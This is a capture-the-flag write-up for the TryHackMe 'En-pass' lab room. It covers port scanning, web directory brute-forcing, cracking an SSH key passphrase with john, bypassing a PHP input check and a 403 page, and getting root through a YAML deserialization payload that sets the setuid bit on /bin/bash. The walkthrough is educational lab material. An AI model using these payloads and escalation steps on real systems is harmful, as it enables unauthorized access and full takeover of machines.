# Write-up for en-pass room TryHackMe
---
## Nmap port scanning
```bash
sudo nmap -sC -sV -p 22,8001 -oN port-scan 10.10.37.185
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 21:42 EDT
Nmap scan report for 10.10.37.185
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds
```
&nbsp;
## Directory bruteforcing
Recursively bruteforce the directory to find the */key* directory containing private key
```bash
ffuf -u http://10.10.37.185:8001/web/resources/infoseek/configure/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.37.185:8001/web/resources/infoseek/configure/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

key                     [Status: 200, Size: 1766, Words: 9, Lines: 31]
```
&nbsp;
##### Here's the image
![[Pasted image 20210404084128.png]]
&nbsp;
 Copy the key to file and crack it using john found the password being *7¡Vamos!*

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 2 needed for performance.
0g 0:00:00:06 DONE (2021-04-03 21:59) 0g/s 2328Kp/s 2328Kc/s 2328KC/s *7¡Vamos!
Session completed
```
&nbsp;
Doing a directory bruteforce and find */reg.php* and */zip*
```bash
gobuster dir -u http://10.10.37.185:8001/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.37.185:8001/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2021/04/03 22:11:35 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2563]
/web                  (Status: 301) [Size: 317] [--> http://10.10.37.185:8001/web/]
/reg.php              (Status: 200) [Size: 2417]                                   
/403.php              (Status: 403) [Size: 1123]                                   
/zip                  (Status: 301) [Size: 317] [--> http://10.10.37.185:8001/zip/]
```
&nbsp;
This is how */reg.php* looks like
![[Pasted image 20210404094429.png]]
&nbsp;
Upon inspecting the source, found PHP code.
```php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);

          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){

                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {

                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          
          
          }

          if ( ($sum) == 9 ){
            

              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";

        
            
            }
            

                    else{

                      echo "  Try Try!!";

                
                    }
          }
        
          else{

            echo "  Try Again!! ";

      
          }     
 
  }

```
Let's analyze the source code!!!
- The input must not be characters from a-z, A-Z, 0-9
- The input contains 9 words separated by a comma ','
- The first word has to be 2 characters and the last word is 3 characters long
- The sixth word can not be the same as the last word and the fourth word must not be the same as the eighth word
- If you do it right, it will print the password

&nbsp;
This is the input i constructed *!!,!,!,####,!,@@@@,!,\*\*\*,???*
and the password is *cimihan_are_you_here?*
![[Pasted image 20210404095503.png]]
&nbsp;
Gobuster also found a 403.php which i bypassed it with *'..;'*. Upon bypassing it, it reveals another user called *'imsau'*
![[Pasted image 20210404102407.png]]
&nbsp;
Log in via ssh with username imsau and password we obtained
```bash
ssh -i id_rsa imsau@10.10.37.185
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-201-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

1 package can be updated.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


$ bash
imsau@enpass:~$ 
```
&nbsp;
Manual enumeration found a python script located at /opt/scripts called **file.py**
```bash
imsau@enpass:/opt/scripts$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 31 19:40 .
drwxr-xr-x 3 root root 4096 Jan 31 16:34 ..
-r-xr-xr-x 1 root root  250 Jan 31 19:40 file.py
imsau@enpass:/opt/scripts$ cat file.py 
#!/usr/bin/python
import yaml


class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")

        def run(self):
                return self.read_file.read()

data  = yaml.load(Execute().run())
imsau@enpass:/opt/scripts$ 
```
&nbsp;
As the script is owned by root and it executes the /tmp/file.yml, we can create the file called *file.yml* to escalate the privilege to root.
```bash
imsau@enpass:/opt/scripts$ nano /tmp/file.yml
imsau@enpass:/opt/scripts$ cat /tmp/file.yml 
!!python/object/apply:os.system ["chmod +s /bin/bash"]

imsau@enpass:/opt/scripts$ 
```
&nbsp;
Then we can execute */bin/bash* as setuid with *-p* option and will give us a root privilege on the machine
```bash
imsau@enpass:/opt/scripts$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# 
```